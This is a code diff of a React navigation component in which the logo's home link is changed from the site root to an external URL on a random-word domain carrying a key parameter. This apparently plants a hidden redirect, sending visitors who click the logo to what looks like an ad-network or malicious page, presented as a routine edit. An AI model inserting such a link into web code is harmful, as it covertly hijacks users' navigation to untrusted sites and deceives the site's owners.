@@ -6,7 +6,7 @@ const Nav = () => {
   return (
     <div>
       <nav className="flex items-center flex-wrap bg-shark-blue xs:p-4 sm:p-5 pr-5 xs:mb-6">
-        <Link href="/" passHref className="inline-flex items-center m-2 mr-4 ">
+        <Link href="https://tremblesyringeillusive.com/csvn2tjq5?key=70d86d2979a39a36de32e2d4cc2092ef" passHref className="inline-flex items-center m-2 mr-4 ">
           <img
             className="fill-current cursor-pointer text-white h-8 w-18 mr-2"
             src="shark-logo-white.svg"
